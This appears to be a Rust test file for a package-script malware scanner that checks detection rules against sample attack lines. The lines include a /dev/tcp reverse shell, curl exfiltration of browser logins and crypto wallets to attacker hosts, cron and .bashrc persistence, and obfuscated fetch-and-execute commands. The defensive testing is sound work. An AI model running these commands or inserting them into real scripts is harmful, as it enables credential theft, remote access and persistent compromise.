    fn detects_reverse_shell() {
        let s = test_scanner();
        let content = "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "REVSHELL_DEV_TCP"));
    }

    #[test]
    fn detects_miner_xmrig() {
        let s = test_scanner();
        let content = "prepare() {\n  ./xmrig --donate-level 0 -o stratum+tcp://pool.supportxmr.com:3333\n}\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "MINER_XMRIG" || f.rule_id == "MINER_POOL")
        );
    }

    #[test]
    fn detects_browser_credential_theft() {
        let s = test_scanner();
        let content = "find ~/.mozilla/firefox -name 'logins.json' -exec curl -F 'file=@{}' https://attacker.com/ \\\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "CRED_BROWSER_PROFILES")
        );
    }

    #[test]
    fn detects_cloud_token_theft() {
        let s = test_scanner();
        let content = "tar -czf /tmp/keys.tar.gz .aws/credentials .kube/config\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "CRED_CLOUD_CREDS"));
    }

    #[test]
    fn detects_crypto_wallet_theft() {
        let s = test_scanner();
        let content = "cat .config/Exodus/exodus.wallet | base64 | curl -d @- https://c2.evil\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "CRED_CRYPTO_WALLETS"));
    }

    #[test]
    fn detects_reverse_proxy_tunnel() {
        let s = test_scanner();
        let content = "curl -fsSL https://tunnel.ngrok.io/c2_connect && ./client --target tunnel.serveo.net\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "THREAT_INTEL_TUNNEL_PROXY")
        );
    }

    #[test]
    fn detects_eval_obfuscation() {
        let s = test_scanner();
        let content =
            "PAYLOAD=\"c3lzdGVtY3RsIHN0b3AgZmlyZXdhbGxk\"\neval \"$(echo $PAYLOAD | base64 -d)\"\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_EVAL"));
    }

    #[test]
    fn detects_reversed_string_exec() {
        let s = test_scanner();
        let content = "echo 'hsab | htam/xile//:sptth lruc' | rev | bash\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_REV_PIPE"));
    }

    #[test]
    fn detects_printf_hex_and_octal() {
        let s = test_scanner();
        let hex = "printf '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70' | sh\n";
        assert!(
            s.scan(hex, None)
                .iter()
                .any(|f| f.rule_id == "OBFUSCATED_PRINTF_HEX")
        );

        let octal = "printf '\\143\\165\\162\\154\\040\\150\\164\\164\\160' | bash\n";
        assert!(
            s.scan(octal, None)
                .iter()
                .any(|f| f.rule_id == "OBFUSCATED_PRINTF_OCTAL")
        );
    }

    #[test]
    fn allows_chrome_sandbox_suid_whitelisted() {
        let s = test_scanner();
        let content =
            "package() {\n  chmod 4755 \"${pkgdir}/opt/google/chrome/chrome-sandbox\"\n}\n";
        let findings = s.scan(content, Some("google-chrome"));
        assert!(!findings.iter().any(|f| f.rule_id == "SUS_CHMOD_SUID"));
    }

    #[test]
    fn allows_vcs_skip_hash_whitelisted() {
        let s = test_scanner();
        let content = "pkgname=neovim-git\npkgver=0.10.0\nsource=('git+https://github.com/neovim/neovim.git')\nsha256sums=('SKIP')\n";
        let findings = s.scan(content, Some("neovim-git"));
        assert!(!findings.iter().any(|f| f.rule_id == "PKG_SKIP_HASH"));
    }

    #[test]
    fn detects_unhashed_source_in_regular_package() {
        let s = test_scanner();
        let content = "pkgname=suspicious-bin\npkgver=1.0\nsource=('https://attacker.com/payload.tar.gz')\nsha256sums=('SKIP')\n";
        let findings = s.scan(content, Some("suspicious-bin"));
        assert!(findings.iter().any(|f| f.rule_id == "PKG_SKIP_HASH"));
    }

    #[test]
    fn detects_packaging_replaces_hijacking() {
        let s = test_scanner();
        let content = "pkgname=fake-keyring\nreplaces=('archlinux-keyring' 'systemd')\n";
        let findings = s.scan(content, Some("fake-keyring"));
        assert!(findings.iter().any(|f| f.rule_id == "PKG_REPLACE_CORE"));
    }

    #[test]
    fn detects_packaging_provides_core_package() {
        let s = test_scanner();
        let content = "pkgname=fake-init\nprovides=('systemd')\n";
        let findings = s.scan(content, Some("fake-init"));
        assert!(findings.iter().any(|f| f.rule_id == "PKG_PROVIDES_CORE"));
    }

    #[test]
    fn detects_crontab_persistence() {
        let s = test_scanner();
        let content = "echo '0 * * * * curl http://c2.evil/bot | sh' | crontab -\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PERSIST_CRON"));
    }

    #[test]
    fn detects_bashrc_persistence() {
        let s = test_scanner();
        let content = "echo 'export LD_PRELOAD=/opt/libhide.so' >> .bashrc\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "PERSIST_PROFILE_INJECT")
        );
    }

    #[test]
    fn detects_telegram_c2_bot() {
        let s = test_scanner();
        let content = "curl -s -X POST https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage -d chat_id=123 -d text=\"$(whoami)\"\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "EXFIL_TELEGRAM_BOT"));
    }

    #[test]
    fn detects_variable_splicing_obfuscation() {
        let s = test_scanner();
        let content = "a=\"c\"\nb=\"u\"\nc=\"r\"\nd=\"l\"\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "SUS_VARIABLE_SPLICING")
        );
    }

    // --- Real shell-pipeline-structure detection (additive, src/shellparse.rs) ---

    #[test]
    fn pipeline_detects_curl_piped_to_bash() {
        let s = test_scanner();
        let content = "build() {\n  curl -s https://example.com/install.sh | bash\n}\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_detects_wget_dash_o_dash_piped_to_sh() {
        let s = test_scanner();
        let content = "prepare() {\n  wget -qO- https://example.com/install.sh | sh\n}\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_detects_multi_stage_curl_tee_bash() {
        let s = test_scanner();
        // The old single-regex EXFIL_CURL_PIPE_EXEC only matches curl piped
        // *directly* into an interpreter; a `tee` stage in between defeats
        // it. Real pipeline-structure parsing catches this regardless of
        // how many stages sit between the fetch and the exec.
        let content =
            "build() {\n  curl -s https://example.com/install.sh | tee /tmp/x.sh | bash\n}\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_curl_download_to_file_not_flagged_by_pipeline_rule() {
        let s = test_scanner();
        // Extremely common, benign PKGBUILD pattern: no pipe at all.
        let content = "build() {\n  curl -sSL https://example.com/foo.tar.gz -o source.tar.gz\n}\n";
        let findings = s.scan(content, None);
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_curl_remote_name_download_not_flagged() {
        let s = test_scanner();
        let content = "build() {\n  curl -sSL -O https://example.com/foo.tar.gz\n}\n";
        let findings = s.scan(content, None);
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_curl_writes_to_file_even_with_pipe_present_not_flagged() {
        let s = test_scanner();
        // Pipe character present on the line, but curl's own output goes to
        // a real file (`-o source.tar.gz`), not into the downstream stage —
        // the fetch_writes_to_file guard must suppress this.
        let content =
            "build() {\n  curl -sSL https://example.com/foo.tar.gz -o source.tar.gz | bash\n}\n";
        let findings = s.scan(content, None);
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_wget_download_to_named_file_not_flagged() {
        let s = test_scanner();
        let content = "build() {\n  wget -O source.tar.gz https://example.com/foo.tar.gz\n}\n";
        let findings = s.scan(content, None);
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_source_array_entry_not_flagged() {
        let s = test_scanner();
        let content = r#"pkgname=foo
pkgver=1.0
source=("https://example.com/foo-${pkgver}.tar.gz")
sha256sums=('38865ecdfca86427382218086ee50a12e259e875155f949c81b539b4bfa254ff')
"#;
        let findings = s.scan(content, Some("foo"));
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_BASE64_EXEC"));
    }

    #[test]
    fn pipeline_comment_mentioning_curl_and_bash_not_flagged() {
        let s = test_scanner();
        let content = "# example: curl https://example.com/install.sh | bash (do NOT do this)\nbuild() {\n  true\n}\n";
        let findings = s.scan(content, None);
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
    }

    #[test]
    fn pipeline_detects_base64_decode_piped_to_bash() {
        let s = test_scanner();
        let content = "prepare() {\n  echo \"$PAYLOAD\" | base64 -d | bash\n}\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_BASE64_EXEC"));
        // The old, coarser regex signature should still fire too (additive,
        // not replacing).
        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
    }

    #[test]
    fn base64_mentioned_in_echo_string_literal_not_flagged() {
        let s = test_scanner();
        // Vision section 6's explicit example: a string literal that merely
        // *mentions* base64 -d is harmless, not an obfuscated-execution
        // pipeline. The precise, structurally-aware rule must not fire, and
        // the refined OBFUSCATED_BASE64 application (context-checked via
        // src/shellparse.rs) must not fire either.
        let content = r#"pkgnote() {
  echo "note: you could manually run base64 -d on the payload if you wanted"
}
"#;
        let findings = s.scan(content, None);
        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_BASE64_EXEC"));
        assert!(!findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
    }

    #[test]
    fn base64_decode_inside_command_substitution_still_flagged() {
        let s = test_scanner();
        // Real execution context even though it's inside double quotes:
        // `$(...)` still runs. Must not be suppressed by the literal-text
        // refinement.
        let content = "eval \"$(echo $PAYLOAD | base64 -d)\"\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
    }
}
